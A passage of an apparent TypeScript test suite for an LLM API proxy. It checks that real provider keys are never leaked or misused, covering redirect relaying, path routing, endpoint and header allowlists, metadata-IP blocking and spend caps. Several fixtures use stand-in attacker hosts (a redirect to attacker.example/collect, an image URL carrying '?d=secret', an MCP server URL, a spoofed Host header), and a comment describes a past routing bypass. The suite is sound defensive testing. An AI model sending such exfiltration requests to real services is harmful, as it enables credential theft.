  const [cut] = await rowsOnceWritten(hungUp.store, 1);
  assertEquals(cut.status, 499, "a truncated completion is not a success");
  assertEquals(cut.inputTokens, 70, "recorded with whatever arrived before the cut");

  // The upstream's own body dies mid-flight.
  const died = await makeSlice({ upstream: streaming({ close: false, die: true }) });
  const failing = await start(died);
  await assertRejects(() => failing.text());
  assertEquals((await died.store.listUsageForRun("r-1"))[0].status, 499);

  // A stream that ran to the end keeps the status the upstream answered with.
  const whole = await makeSlice({ upstream: streaming({ close: true }) });
  await (await start(whole)).text();
  assertEquals((await whole.store.listUsageForRun("r-1"))[0].status, 200);
});

// ── custom model endpoints ─────────────────────────────────────────────────────────────────

function customProvider(overrides: Partial<CustomProvider> = {}): CustomProvider {
  return {
    id: "cloudflare",
    label: "Workers AI",
    baseUrl: "https://api.cloudflare.com/client/v4/accounts/acct/ai/v1",
    authHeader: "api-key",
    authScheme: null,
    extraHeaders: { "cf-ray-hint": "eu" },
    models: [{ id: "llama-4", label: "Llama 4" }],
    archivedAt: null,
    createdAt: T0,
    updatedAt: T0,
    ...overrides,
  };
}

/** forwardTarget answers null for a refusal; every case below expects a target. */
function forwardedTo(baseUrl: string, clientBasePath: string, path: string): string {
  const target = forwardTarget(baseUrl, clientBasePath, new URL(`http://p${path}`));
  assert(target !== null, `${path} was refused`);
  return target.href;
}

test("the real key never follows a redirect — the 3xx is relayed instead", async () => {
  // fetch strips `authorization` across an origin but KEEPS `x-api-key` and `api-key` (measured
  // on Deno 2.9.5 and Bun 1.4.2), and those are the two headers the `anthropic` built-in and an Azure-style custom
  // endpoint send the REAL key in. A run picks the path and the query, so an open redirect on
  // any registered upstream would have exfiltrated the unsealed key. Hence `redirect: "manual"`,
  // which is what this asserts: the fake upstream cannot follow anything, the real one can.
  const { handler, env, upstreamRequests, store } = await makeSlice({
    upstream: () =>
      new Response(null, {
        status: 307,
        headers: { location: "https://attacker.example/collect" },
      }),
  });
  const res = await handler(messages(env.ANTHROPIC_API_KEY, { model: "claude-sonnet-5" }));

  assertEquals(upstreamRequests.length, 1);
  assertEquals(upstreamRequests[0].redirect, "manual");
  assertEquals(upstreamRequests[0].headers.get("x-api-key"), "sk-ant-realkey");

  // The 3xx is relayed as any other answer is — this proxy does not interpret an upstream, and
  // the harness's own SDK, which holds only the virtual key, decides what to do with it. A
  // built-in's headers come back by allowlist, and neither built-in redirects, so its Location
  // stays here; a custom endpoint's is relayed.
  assertEquals(res.status, 307);
  assertEquals(res.headers.get("location"), null);
  await res.body?.cancel();
  assertEquals((await store.listUsageForRun("r-1"))[0].status, 307);
});

test("the real fetch relays a redirect and never follows it with the key", async () => {
  // The same property against the runtime's own fetch, not a recording fake: `redirect: "manual"`
  // has to hold where the key would actually travel.
  const landed: Request[] = [];
  const elsewhere = await serve({ port: 0, hostname: "127.0.0.1", onListen() {} }, (req) => {
    landed.push(req);
    return new Response("collected");
  });
  const upstream = await serve(
    { port: 0, hostname: "127.0.0.1", onListen() {} },
    () =>
      new Response(null, {
        status: 307,
        headers: { location: `http://localhost:${elsewhere.addr.port}/collect` },
      }),
  );
  try {
    const { handler, env } = await makeSlice({
      realUpstream: `http://127.0.0.1:${upstream.addr.port}`,
    });
    const res = await handler(messages(env.ANTHROPIC_API_KEY, { model: "claude-sonnet-5" }));
    assertEquals(res.status, 307);
    await res.body?.cancel();
    assertEquals(landed.length, 0, "the redirect was followed");
  } finally {
    await upstream.shutdown();
    await elsewhere.shutdown();
  }
});

test("the forward path keeps the upstream's own path and drops the client's base segment", () => {
  // Exactly the table in forwardTarget's comment — the whole reason the rule was rewritten.
  const anthropic = BUILTIN_PROVIDERS.anthropic;
  assertEquals(
    forwardedTo(anthropic.baseUrl, anthropic.clientBasePath, "/v1/messages"),
    "https://api.anthropic.com/v1/messages",
  );
  const openai = BUILTIN_PROVIDERS.openai;
  assertEquals(
    forwardedTo(openai.baseUrl, openai.clientBasePath, "/v1/chat/completions"),
    "https://api.openai.com/v1/chat/completions",
  );
  assertEquals(
    forwardedTo(
      "https://api.cloudflare.com/client/v4/accounts/acct/ai/v1",
      "/v1",
      "/v1/chat/completions",
    ),
    "https://api.cloudflare.com/client/v4/accounts/acct/ai/v1/chat/completions",
  );

  // Google AI Studio's OpenAI-compatible endpoint: a base path that is not `/v1` at all.
  assertEquals(
    forwardedTo(
      "https://generativelanguage.googleapis.com/v1beta/openai",
      "/v1",
      "/v1/models?page=2",
    ),
    "https://generativelanguage.googleapis.com/v1beta/openai/models?page=2",
  );
  // A trailing slash on the base is not a second one on the target.
  assertEquals(forwardedTo("https://host/a/v1/", "/v1", "/v1/chat"), "https://host/a/v1/chat");
  // And the base segment alone still reaches the endpoint's own root.
  assertEquals(forwardedTo("https://host/a/v1", "/v1", "/v1"), "https://host/a/v1");
});

test("a path missing the client's base segment has no target at all", () => {
  // The second spelling is the bug: `/chat/completions` reached the SAME upstream endpoint as
  // `/v1/chat/completions` and skipped every path-keyed rule on the way. There is one spelling.
  for (const path of ["/chat/completions", "/v1beta/x", "/", "/v1x/chat"]) {
    assertEquals(forwardTarget("https://host/a/v1", "/v1", new URL(`http://p${path}`)), null);
  }
  // Anthropic's prefix is empty, so nothing of its own can be missing: every path still routes.
  const anthropic = BUILTIN_PROVIDERS.anthropic;
  assertEquals(
    forwardedTo(anthropic.baseUrl, anthropic.clientBasePath, "/v1/models"),
    "https://api.anthropic.com/v1/models",
  );
});

test("a custom endpoint forwards under its own path, with a bare-value header and its extras", async () => {
  const { handler, env, upstreamRequests } = await makeSlice({
    custom: customProvider(),
    key: providerKey({ provider: "cloudflare", encryptedSecret: "sealed:cf-realkey" }),
  });
  // pi→proxy is ALWAYS a bearer, whatever the admin chose for proxy→upstream.
  const req = new Request("http://proxy.test/v1/chat/completions", {
    method: "POST",
    headers: {
      "content-type": "application/json",
      authorization: `Bearer ${env.RYPH_MODEL_API_KEY}`,
    },
    body: JSON.stringify({ model: "llama-4" }),
  });
  assertEquals((await handler(req)).status, 200);

  const [seen] = upstreamRequests;
  assertEquals(
    seen.url,
    "https://api.cloudflare.com/client/v4/accounts/acct/ai/v1/chat/completions",
  );
  // `scheme: null` sends the bare value — an `api-key` header carrying "Bearer …" would 401.
  assertEquals(seen.headers.get("api-key"), "cf-realkey");
  assertEquals(seen.headers.get("cf-ray-hint"), "eu");
  assertEquals(seen.headers.get("authorization"), null, "the virtual key never rides on");
});

test("the un-prefixed spelling of a spending endpoint is refused, not forwarded", async () => {
  // The bypass this test exists for: `SPENDING_PATH` is matched against the INCOMING path while
  // the client's `/v1` is stripped before the join, so `/chat/completions` and
  // `/v1/chat/completions` reached the same upstream endpoint and only the second was policed.
  // A body naming no model bought tokens with the real key under a live allowlist:
  //
  //   POST /v1/chat/completions {"messages":[]}  → 403
  //   POST    /chat/completions {"messages":[]}  → 200, forwarded with the real key
  const openai = await makeSlice({
    key: providerKey({ provider: "openai", encryptedSecret: "sealed:sk-oai" }),
    allowedModels: ["gpt-5"],
  });
  const bypass = new Request("http://proxy.test/chat/completions", {
    method: "POST",
    headers: {
      "content-type": "application/json",
      authorization: `Bearer ${openai.env.OPENAI_API_KEY}`,
    },
    body: JSON.stringify({ messages: [] }),
  });
  assertEquals((await openai.handler(bypass)).status, 404);
  assertEquals(openai.upstreamRequests.length, 0, "nothing forwarded with the real key");

  // And it is the ROUTING that refuses, not the allowlist: a request naming an allowed model
  // has nothing left to object to and is still refused, on both kinds of provider.
  for (
    const [opts, model] of [
      [{ key: providerKey({ provider: "openai", encryptedSecret: "sealed:sk-oai" }) }, "gpt-5"],
      [{
        custom: customProvider(),
        key: providerKey({ provider: "cloudflare", encryptedSecret: "sealed:cf-realkey" }),
      }, "llama-4"],
    ] as const
  ) {
    const slice = await makeSlice({ ...opts, allowedModels: "*" });
    const token = slice.env.OPENAI_API_KEY ?? slice.env.RYPH_MODEL_API_KEY;
    const res = await slice.handler(
      new Request("http://proxy.test/chat/completions", {
        method: "POST",
        headers: { "content-type": "application/json", authorization: `Bearer ${token}` },
        body: JSON.stringify({ model }),
      }),
    );
    assertEquals(res.status, 404);
    assert(((await res.json()).error as string).includes("/v1"));
    assertEquals(slice.upstreamRequests.length, 0);
  }
});

test("a CUSTOM endpoint serves its model call and models list, and nothing else", async () => {
  // The real key behind an OpenAI-compatible gateway reaches files, batches, fine-tuning and the
  // account's key-info routes as surely as OpenAI's does. A run gets the dialect's two routes.
  const { handler, env, upstreamRequests } = await makeSlice({
    custom: customProvider(),
    key: providerKey({ provider: "cloudflare", encryptedSecret: "sealed:cf-realkey" }),
    allowedModels: ["llama-4"],
  });
  const call = (method: string, path: string, body?: unknown) =>
    handler(
      new Request(`http://proxy.test${path}`, {
        method,
        headers: {
          "content-type": "application/json",
          authorization: `Bearer ${env.RYPH_MODEL_API_KEY}`,
        },
        body: body === undefined ? undefined : JSON.stringify(body),
      }),
    );

  const refused: Array<[string, string, unknown?]> = [
    // Azure's deployment-in-the-path shape: the path would pick the model.
    ["POST", "/v1/openai/deployments/llama-4/chat/completions", { model: "llama-4" }],
    ["GET", "/v1/files"],
    ["DELETE", "/v1/files/file-other-run"],
    ["GET", "/v1/batches"],
    ["POST", "/v1/fine_tuning/jobs", { model: "llama-4", training_file: "file-x" }],
    ["GET", "/v1/auth/key"],
    ["GET", "/v1/key/info"],
    ["POST", "/v1/embeddings", { model: "llama-4", input: "x" }],
    ["GET", "/v1/chat/completions"],
    ["POST", "/v1/responses", { model: "llama-4" }],
  ];
  for (const [method, path, body] of refused) {
    const res = await call(method, path, body);
    assertEquals(res.status, 404, `${method} ${path}`);
    assertEquals((await res.json()).code, "endpoint_not_allowed");
  }
  assertEquals(upstreamRequests.length, 0);

  assertEquals((await call("GET", "/v1/models")).status, 200);
  assertEquals((await call("GET", "/v1/models/llama-4")).status, 200);
  assertEquals((await call("POST", "/v1/chat/completions", { model: "llama-4" })).status, 200);
  assertEquals(upstreamRequests.length, 3);
  // A body that names no model is still refused: the route spends.
  const unnamed = await call("POST", "/v1/chat/completions", { messages: [] });
  assertEquals(unnamed.status, 403);
  assertEquals(upstreamRequests.length, 3);
});

test("a CUSTOM endpoint refusing the proxy's credential is answered with a fixed body", async () => {
  // A gateway's refusal can quote the key it was handed; the run never reads it.
  const { handler, env, store } = await makeSlice({
    custom: customProvider(),
    key: providerKey({ provider: "cloudflare", encryptedSecret: "sealed:cf-realkey" }),
    upstream: () =>
      Response.json({ error: { message: "Invalid key cf-realkey" } }, { status: 401 }),
  });
  const res = await handler(
    new Request("http://proxy.test/v1/chat/completions", {
      method: "POST",
      headers: {
        "content-type": "application/json",
        authorization: `Bearer ${env.RYPH_MODEL_API_KEY}`,
      },
      body: JSON.stringify({ model: "llama-4" }),
    }),
  );
  assertEquals(res.status, 401);
  const text = await res.text();
  assert(!text.includes("cf-realkey"), text);
  assertEquals(JSON.parse(text).code, "upstream_credential_refused");
  const [row] = await store.listUsageForRun("r-1");
  assertEquals([row.status, row.estimated], [401, false]);
});

test("a CUSTOM endpoint whose name now resolves inside the network is never dialled", async () => {
  let answer = ["93.184.216.34"];
  const lookups: string[] = [];
  const { handler, env, upstreamRequests, clock } = await makeSlice({
    custom: customProvider(),
    key: providerKey({ provider: "cloudflare", encryptedSecret: "sealed:cf-realkey" }),
    resolveHost: (host) => {
      lookups.push(host);
      return Promise.resolve(answer);
    },
  });
  const buy = () =>
    handler(
      new Request("http://proxy.test/v1/chat/completions", {
        method: "POST",
        headers: {
          "content-type": "application/json",
          authorization: `Bearer ${env.RYPH_MODEL_API_KEY}`,
        },
        body: JSON.stringify({ model: "llama-4" }),
      }),
    );
  assertEquals((await buy()).status, 200);
  assertEquals(lookups, ["api.cloudflare.com"]);
  // A pass is trusted for half a minute, then the name is asked again.
  answer = ["169.254.169.254"];
  assertEquals((await buy()).status, 200);
  assertEquals(lookups.length, 1);
  clock.nowMs += 31_000;
  const refused = await buy();
  assertEquals(refused.status, 502);
  assertEquals((await refused.json()).code, "endpoint_misconfigured");
  assertEquals(upstreamRequests.length, 2, "the key never went to the metadata server");
});

test("a CUSTOM endpoint's query keeps only api-version", async () => {
  const { handler, env, upstreamRequests } = await makeSlice({
    custom: customProvider(),
    key: providerKey({ provider: "cloudflare", encryptedSecret: "sealed:cf-realkey" }),
    allowedModels: ["llama-4"],
  });
  const res = await handler(
    new Request(
      "http://proxy.test/v1/chat/completions?api-version=2025-01-01&key=x&model=other",
      {
        method: "POST",
        headers: {
          "content-type": "application/json",
          authorization: `Bearer ${env.RYPH_MODEL_API_KEY}`,
        },
        body: JSON.stringify({ model: "llama-4" }),
      },
    ),
  );
  assertEquals(res.status, 200);
  assertEquals(new URL(upstreamRequests[0].url).search, "?api-version=2025-01-01");
  await handler(
    new Request("http://proxy.test/v1/models?after=x", {
      headers: { authorization: `Bearer ${env.RYPH_MODEL_API_KEY}` },
    }),
  );
  assertEquals(new URL(upstreamRequests[1].url).search, "");
});

/** A slice on the `openai` built-in, and a caller that sends anything with its credential. */
async function openAiSlice(opts: Parameters<typeof makeSlice>[0] = {}) {
  const slice = await makeSlice({
    key: providerKey({ provider: "openai", encryptedSecret: "sealed:sk-oai" }),
    ...opts,
  });
  const call = (
    method: string,
    path: string,
    body?: unknown,
    headers: Record<string, string> = {},
  ) =>
    slice.handler(
      new Request(`http://proxy.test${path}`, {
        method,
        headers: {
          "content-type": "application/json",
          authorization: `Bearer ${slice.env.OPENAI_API_KEY}`,
          ...headers,
        },
        body: body === undefined ? undefined : JSON.stringify(body),
      }),
    );
  return { ...slice, call };
}

test("a BUILT-IN serves a run its model calls and nothing else the real key reaches", async () => {
  // Each of these answered to the real key before: unmetered spend (batches, fine-tuning, a
  // background-free embeddings call), other runs' data (files, stored responses and completions)
  // and the organization's own admin API. No allowlist and no cap, so nothing else refuses them.
  const openai = await openAiSlice();
  const refusedOpenAi: Array<[string, string, unknown?]> = [
    ["POST", "/v1/batches", {
      input_file_id: "file-x",
      endpoint: "/v1/chat/completions",
      completion_window: "24h",
    }],
    ["GET", "/v1/batches"],
    ["POST", "/v1/fine_tuning/jobs", { training_file: "file-x", model: "gpt-5" }],
    ["POST", "/v1/files", { purpose: "batch" }],
    ["GET", "/v1/files"],
    ["GET", "/v1/files/file-other-run/content"],
    ["DELETE", "/v1/files/file-other-run"],
    ["GET", "/v1/organization/admin_api_keys"],
    ["GET", "/v1/organization/projects"],
    ["GET", "/v1/responses/resp_other_run"],
    ["DELETE", "/v1/responses/resp_other_run"],
    ["GET", "/v1/chat/completions"],
    ["POST", "/v1/embeddings", { model: "text-embedding-3-small", input: "x" }],
    ["POST", "/v1/images/generations", { model: "gpt-image-1", prompt: "x" }],
    ["POST", "/v1/vector_stores", { name: "x" }],
    ["POST", "/v1/responses/compact", { model: "gpt-5" }],
    // Spellings of an allowed route are not that route.
    ["POST", "/v1/responses/", { model: "gpt-5" }],
    ["GET", "/v1/responses"],
    ["POST", "/v1/models", {}],
  ];
  for (const [method, path, body] of refusedOpenAi) {
    const res = await openai.call(method, path, body);
    assertEquals(res.status, 404, `${method} ${path}`);
    const refusal = await res.json();
    assertEquals(refusal.code, "endpoint_not_allowed");
    // The refusal says what IS served, so an agent reads why instead of retrying.
    assert((refusal.error as string).includes("POST /v1/responses"));
  }
  assertEquals(openai.upstreamRequests.length, 0, "nothing reached OpenAI with the real key");

  const anthropic = await makeSlice();
  const refusedAnthropic: Array<[string, string, unknown?]> = [
    ["POST", "/v1/messages/batches", { requests: [] }],
    ["GET", "/v1/messages/batches"],
    ["GET", "/v1/messages/batches/msgbatch_1/results"],
    ["POST", "/v1/files", {}],
    ["GET", "/v1/files"],
    ["GET", "/v1/skills"],
    ["POST", "/v1/complete", { model: "claude-sonnet-5", prompt: "x" }],
    ["GET", "/v1/organizations/api_keys"],
    ["GET", "/v1/organizations/usage_report/messages"],
  ];
  for (const [method, path, body] of refusedAnthropic) {
    const res = await anthropic.handler(
      new Request(`http://proxy.test${path}`, {
        method,
        headers: {
          "content-type": "application/json",
          "x-api-key": anthropic.env.ANTHROPIC_API_KEY,
        },
        body: body === undefined ? undefined : JSON.stringify(body),
      }),
    );
    assertEquals(res.status, 404, `${method} ${path}`);
    assertEquals((await res.json()).code, "endpoint_not_allowed");
  }
  assertEquals(anthropic.upstreamRequests.length, 0, "nothing reached Anthropic with the real key");
});

test("an unknown token learns nothing from a refused route: 401 first", async () => {
  const { call } = await openAiSlice();
  const res = await call("GET", "/v1/files", undefined, { authorization: "Bearer ryph-vk-nope" });
  assertEquals(res.status, 401);
});

test("what the harnesses do call is still served on each built-in", async () => {
  const openai = await openAiSlice({ allowedModels: ["gpt-5"] });
  for (
    const [method, path, body] of [
      ["POST", "/v1/responses", { model: "gpt-5", input: "x", store: false }],
      ["POST", "/v1/chat/completions", { model: "gpt-5", messages: [] }],
      ["GET", "/v1/models"],
      ["GET", "/v1/models/gpt-5"],
    ] as const
  ) {
    const res = await openai.call(method, path, body);
    assertEquals(res.status, 200, `${method} ${path}`);
    await res.body?.cancel();
  }
  assertEquals(openai.upstreamRequests.map((r) => r.url), [
    "https://api.openai.com/v1/responses",
    "https://api.openai.com/v1/chat/completions",
    "https://api.openai.com/v1/models",
    "https://api.openai.com/v1/models/gpt-5",
  ]);

  // Claude Code's two calls, with its `?beta=true`, and the models list.
  const anthropic = await makeSlice({ allowedModels: ["claude-sonnet-5"] });
  const countTokens = await anthropic.handler(
    new Request("http://proxy.test/v1/messages/count_tokens?beta=true", {
      method: "POST",
      headers: {
        "content-type": "application/json",
        "x-api-key": anthropic.env.ANTHROPIC_API_KEY,
      },
      body: JSON.stringify({ model: "claude-sonnet-5", messages: [] }),
    }),
  );
  assertEquals(countTokens.status, 200);
  await countTokens.body?.cancel();
  // It names a model, so it is held to the allowlist like the messages call it sizes.
  const otherModel = await anthropic.handler(
    new Request("http://proxy.test/v1/messages/count_tokens", {
      method: "POST",
      headers: { "x-api-key": anthropic.env.ANTHROPIC_API_KEY },
      body: JSON.stringify({ model: "claude-opus-9", messages: [] }),
    }),
  );
  assertEquals(otherModel.status, 403);
  await otherModel.body?.cancel();
  assertEquals(anthropic.upstreamRequests.map((r) => r.url), [
    "https://api.anthropic.com/v1/messages/count_tokens?beta=true",
  ]);
});

test("a model call to a built-in must carry a JSON object, whatever the allowlist", async () => {
  // With no allowlist and no cap `decide` has nothing to object to; a body this proxy cannot
  // walk would be judged on nothing, so it is refused rather than left to the provider's parser.
  const { call, upstreamRequests } = await openAiSlice();
  for (const body of [["not", "an", "object"], "a string", 7]) {
    const res = await call("POST", "/v1/responses", body);
    assertEquals(res.status, 400);
    assertEquals((await res.json()).code, "body_not_json");
  }
  const bare = await call("POST", "/v1/chat/completions");
  assertEquals(bare.status, 400);
  await bare.body?.cancel();
  assertEquals(upstreamRequests.length, 0);
});

test("a background response is refused: its usage would never pass through to be counted", async () => {
  const { call, upstreamRequests } = await openAiSlice({ spendUsd: 100 });
  for (const background of [true, "true", 1, {}]) {
    const res = await call("POST", "/v1/responses", { model: "gpt-5", input: "x", background });
    assertEquals(res.status, 400, JSON.stringify(background));
    assertEquals((await res.json()).code, "background_not_supported");
  }
  // The last occurrence is the one a parser keeps, so a `false` first cannot hide a `true`.
  const smuggled = await openAiSlice();
  const twice = await smuggled.handler(
    new Request("http://proxy.test/v1/responses", {
      method: "POST",
      headers: { authorization: `Bearer ${smuggled.env.OPENAI_API_KEY}` },
      body: '{"model":"gpt-5","background":false,"input":"x","background":true}',
    }),
  );
  assertEquals(twice.status, 400);
  await twice.body?.cancel();
  assertEquals(upstreamRequests.length + smuggled.upstreamRequests.length, 0);

  // Asked for in the foreground, or not at all, it is a model call like any other. So is a
  // stored one: its id comes back to this run only, and every route that reads a stored
  // response back is refused above.
  for (const extra of [{ background: false }, { background: null }, {}, { store: true }]) {
    const res = await call("POST", "/v1/responses", { model: "gpt-5", input: "x", ...extra });
    assertEquals(res.status, 200, JSON.stringify(extra));
    await res.body?.cancel();
  }
  assertEquals(upstreamRequests.length, 4);
});

test("a built-in's request goes up with an allowlist of the caller's headers", async () => {
  const openai = await openAiSlice();
  const res = await openai.call("POST", "/v1/responses", { model: "gpt-5", input: "x" }, {
    accept: "text/event-stream",
    "user-agent": "pi/1.0.0",
    "openai-beta": "responses=v1",
    session_id: "s-1",
    // The organization and project a key is billed under are the caller's to pick never.
    "openai-organization": "org-someone-else",
    "openai-project": "proj_other",
    "x-stainless-arch": "x64",
    cookie: "a=b",
  });
  assertEquals(res.status, 200);
  await res.body?.cancel();
  const up = openai.upstreamRequests[0].headers;
  assertEquals(up.get("authorization"), "Bearer sk-oai");
  assertEquals(up.get("content-type"), "application/json");
  assertEquals(up.get("accept"), "text/event-stream");
  assertEquals(up.get("user-agent"), "pi/1.0.0");
  assertEquals(up.get("openai-beta"), "responses=v1");
  assertEquals(up.get("session_id"), "s-1");
  for (const name of ["openai-organization", "openai-project", "x-stainless-arch", "cookie"]) {
    assertEquals(up.get(name), null, name);
  }

  // Anthropic's beta flags are vetted one by one: what changes one metered call goes up, what
  // reaches stored files, a container, or an address the run chose does not.
  const anthropic = await makeSlice();
  const send = (beta: string) =>
    anthropic.handler(
      new Request("http://proxy.test/v1/messages", {
        method: "POST",
        headers: {
          "content-type": "application/json",
          "x-api-key": anthropic.env.ANTHROPIC_API_KEY,
          "anthropic-version": "2023-06-01",
          "anthropic-beta": beta,
        },
        body: JSON.stringify({ model: "claude-sonnet-5" }),
      }),
    );
  await (await send(
    "interleaved-thinking-2025-05-14, files-api-2025-04-14,context-management-2025-06-27," +
      "mcp-client-2025-04-04,code-execution-2025-08-25,skills-2025-10-02,unheard-of-2027-01-01," +
      "web-search-2025-03-05,web-fetch-2025-09-10",
  )).body?.cancel();
  await (await send("files-api-2025-04-14,message-batches-2024-09-24")).body?.cancel();
  const [mixed, onlyRefused] = anthropic.upstreamRequests.map((r) => r.headers);
  assertEquals(
    mixed.get("anthropic-beta"),
    "interleaved-thinking-2025-05-14,context-management-2025-06-27",
  );
  assertEquals(mixed.get("anthropic-version"), "2023-06-01");
  assertEquals(onlyRefused.get("anthropic-beta"), null);
});

test("a body asking the provider to run a tool or fetch a URL is refused, nothing sent", async () => {
  const openai = await openAiSlice();
  const mcp = await openai.call("POST", "/v1/responses", {
    model: "gpt-5",
    tools: [{ type: "mcp", server_label: "x", server_url: "https://attacker.example/mcp" }],
  });
  assertEquals(mcp.status, 400);
  const refusal = await mcp.json();
  assertEquals(refusal.code, "body_not_allowed");
  assertEquals(refusal.refused, ['tools[0]: tool type "mcp" runs on the provider\'s side']);
  const image = await openai.call("POST", "/v1/chat/completions", {
    model: "gpt-5",
    messages: [{
      role: "user",
      content: [{ type: "image_url", image_url: { url: "https://attacker.example/?d=secret" } }],
    }],
  });
  assertEquals(image.status, 400);
  const stored = await openai.call("POST", "/v1/responses", {
    model: "gpt-5",
    previous_response_id: "resp_other_run",
  });
  assertEquals(stored.status, 400);
  assertEquals(openai.upstreamRequests.length, 0);

  const anthropic = await makeSlice();
  const search = await anthropic.handler(messages(anthropic.env.ANTHROPIC_API_KEY, {
    model: "claude-sonnet-5",
    tools: [{ type: "web_fetch_20250910", name: "web_fetch" }],
  }));
  assertEquals(search.status, 400);
  assertEquals(anthropic.upstreamRequests.length, 0);

  // A custom endpoint of the same dialect is held to the same rule.
  const custom = await makeSlice({
    custom: customProvider(),
    key: providerKey({ provider: "cloudflare", encryptedSecret: "sealed:cf-realkey" }),
  });
  const res = await custom.handler(
    new Request("http://proxy.test/v1/chat/completions", {
      method: "POST",
      headers: {
        "content-type": "application/json",
        authorization: `Bearer ${custom.env.RYPH_MODEL_API_KEY}`,
      },
      body: JSON.stringify({ model: "llama-4", tools: [{ type: "web_search" }] }),
    }),
  );
  assertEquals(res.status, 400);
  assertEquals(custom.upstreamRequests.length, 0);
});

test("a built-in's response comes back with an allowlist of the provider's headers", async () => {
  const upstreamHeaders = {
    "content-type": "application/json",
    "x-request-id": "req_1",
    "request-id": "req_2",
    "retry-after": "3",
    "x-ratelimit-remaining-tokens": "1000",
    "anthropic-ratelimit-requests-remaining": "9",
    // Who the key belongs to, and the rest of what a provider says about the account.
    "openai-organization": "org-acme",
    "openai-project": "proj_acme",
    "anthropic-organization-id": "1f1e-acme",
    "set-cookie": "__cf_bm=x",
    "cf-ray": "abc",
  };
  for (
    const slice of [
      await openAiSlice({ upstream: () => Response.json({}, { headers: upstreamHeaders }) }),
      await makeSlice({ upstream: () => Response.json({}, { headers: upstreamHeaders }) }),
    ]
  ) {
    const token = slice.env.OPENAI_API_KEY ?? slice.env.ANTHROPIC_API_KEY;
    const path = slice.env.OPENAI_API_KEY ? "/v1/responses" : "/v1/messages";
    const res = await slice.handler(
      new Request(`http://proxy.test${path}`, {
        method: "POST",
        headers: { authorization: `Bearer ${token}`, "x-api-key": token },
        body: JSON.stringify({ model: "m" }),
      }),
    );
    await res.body?.cancel();
    const back = Object.fromEntries(res.headers);
    assertEquals(back, {
      "content-type": "application/json",
      "x-request-id": "req_1",
      "request-id": "req_2",
      "retry-after": "3",
      "x-ratelimit-remaining-tokens": "1000",
      "anthropic-ratelimit-requests-remaining": "9",
    });
  }

  // A custom endpoint's answer is relayed as it came: this proxy knows nothing of its headers.
  const custom = await makeSlice({
    custom: customProvider(),
    key: providerKey({ provider: "cloudflare", encryptedSecret: "sealed:cf-realkey" }),
    upstream: () => Response.json({}, { headers: { "cf-ray": "abc" } }),
  });
  const res = await custom.handler(
    new Request("http://proxy.test/v1/chat/completions", {
      method: "POST",
      headers: { authorization: `Bearer ${custom.env.RYPH_MODEL_API_KEY}` },
      body: JSON.stringify({ model: "llama-4" }),
    }),
  );
  await res.body?.cancel();
  assertEquals(res.headers.get("cf-ray"), "abc");
});

test("extraHeaders that name the credential's header are refused at the forward, whatever is stored", async () => {
  const { handler, env, upstreamRequests } = await makeSlice({
    custom: customProvider({
      authHeader: "authorization",
      authScheme: "Bearer",
      extraHeaders: { authorization: "Bearer not-the-real-key" },
    }),
    key: providerKey({ provider: "cloudflare", encryptedSecret: "sealed:cf-realkey" }),
  });
  const req = new Request("http://proxy.test/v1/chat/completions", {
    method: "POST",
    headers: {
      "content-type": "application/json",
      authorization: `Bearer ${env.RYPH_MODEL_API_KEY}`,
    },
    body: JSON.stringify({ model: "llama-4" }),
  });
  assertEquals((await handler(req)).status, 502);
  assertEquals(upstreamRequests.length, 0);
});

test("a Host in a stored endpoint's extraHeaders is refused at the forward", async () => {
  const { handler, env, upstreamRequests } = await makeSlice({
    custom: customProvider({ extraHeaders: { HOST: "attacker.example.com" } }),
    key: providerKey({ provider: "cloudflare", encryptedSecret: "sealed:cf-realkey" }),
  });
  const req = new Request("http://proxy.test/v1/chat/completions", {
    method: "POST",
    headers: {
      "content-type": "application/json",
      authorization: `Bearer ${env.RYPH_MODEL_API_KEY}`,
    },
    body: JSON.stringify({ model: "llama-4" }),
  });
  assertEquals((await handler(req)).status, 502);
  assertEquals(upstreamRequests.length, 0);
});

test("archiving a custom endpoint cuts off an in-flight run: 403, and never a forward", async () => {
  const { handler, store, env, upstreamRequests } = await makeSlice({
    custom: customProvider(),
    key: providerKey({ provider: "cloudflare", encryptedSecret: "sealed:cf-realkey" }),
  });
  await store.archiveCustomProvider("cloudflare", T0);
  const req = new Request("http://proxy.test/v1/chat/completions", {
    method: "POST",
    headers: {
      "content-type": "application/json",
      authorization: `Bearer ${env.RYPH_MODEL_API_KEY}`,
    },
    body: JSON.stringify({ model: "llama-4" }),
  });
  const res = await handler(req);
  assertEquals(res.status, 403, "the caller is who it claims — it may no longer spend");
  assert(((await res.json()).error as string).includes("archived"));
  assertEquals(upstreamRequests.length, 0);
  assertEquals(await store.listUsageForRun("r-1"), [], "and it lands no row of spend");
});

test("a custom endpoint's usage is metered in the OpenAI shape and attributed to its slug", async () => {
  const { handler, store, env } = await makeSlice({
    custom: customProvider(),
    key: providerKey({ provider: "cloudflare", encryptedSecret: "sealed:cf-realkey" }),
    upstream: () =>
      Response.json({
        model: "llama-4",
        // Chat Completions counts the cached tokens INSIDE prompt_tokens; the dialect is what
        // tells the meter to take them back out, and the dialect came off the row.
        usage: {
          prompt_tokens: 100,
          completion_tokens: 20,
          prompt_tokens_details: { cached_tokens: 40 },
        },
      }),
  });
  await (await handler(
    new Request("http://proxy.test/v1/chat/completions", {
      method: "POST",
      headers: {
        "content-type": "application/json",
        authorization: `Bearer ${env.RYPH_MODEL_API_KEY}`,
      },
      body: JSON.stringify({ model: "llama-4" }),
    }),
  )).text();
  const [row] = await store.listUsageForRun("r-1");
  assertEquals([row.provider, row.model], ["cloudflare", "llama-4"]);
  assertEquals([row.inputTokens, row.outputTokens, row.cacheReadTokens], [60, 20, 40]);
});

// ── the caps ───────────────────────────────────────────────────────────────────────────────

/** A completion that costs exactly `usd` on claude-sonnet-5 (2 per million input, no output). */
const costing = (usd: number) =>
  Response.json({ usage: { input_tokens: Math.round(usd / 2e-6), output_tokens: 0 } });

test("a run past its spend cap keeps forwarding through the backstop grace, then is refused 403", async () => {
  const { handler, env, upstreamRequests, clock } = await makeSlice({
    spendUsd: 1,
    backstopMs: 30_000,
    upstream: () => costing(0.6),
  });
  const buy = () => handler(messages(env.ANTHROPIC_API_KEY, { model: "claude-sonnet-5" }));
  await (await buy()).text(); // $0.60
  await (await buy()).text(); // $1.20 — over, but the orchestrator gets its grace first
  clock.nowMs += 29_000;
  assertEquals((await buy()).status, 200);
  clock.nowMs += 2_000;
  const refused = await buy();
  assertEquals(refused.status, 403);
  assertEquals(await refused.json(), {
    error: "this run has reached its spend cap",
    code: "limit_reached",
    limit: "spend",
  });
  assertEquals(upstreamRequests.length, 3, "the refusal never reached the provider");
  // A request that buys nothing still answers on a capped-out run.
